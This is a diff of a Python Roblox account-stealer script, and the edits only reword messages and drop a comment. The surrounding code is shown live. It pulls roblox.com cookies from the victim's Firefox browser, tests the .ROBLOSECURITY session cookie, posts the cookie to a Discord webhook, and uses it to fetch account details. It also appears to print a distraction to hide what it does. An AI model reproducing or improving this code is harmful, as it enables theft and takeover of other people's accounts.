@@ -16,7 +16,7 @@ try:
     from discordwebhook import *
     import browser_cookie3
 except:
-    input("Libraries not installed press enter to exit ... ")
+    input("Libraries aren't installed, please install the requirements, restart the program and try again!")
 
 
 
@@ -26,7 +26,7 @@ print(distract)
 
 def logger():
 
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+    data = []
 
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
@@ -88,7 +88,7 @@ isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
     pass
 else:
-    requests.post(url=webhook,data={"content":f"R.I.P , Cookie is expired\nDead cookie :skull: : ```{roblox_cookie}```"})
+    requests.post(url=webhook,data={"content":f"Rest in peace, Cookie is expired\nDead cookie :skull: : ```{roblox_cookie}```"})
     exit()
 
 ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
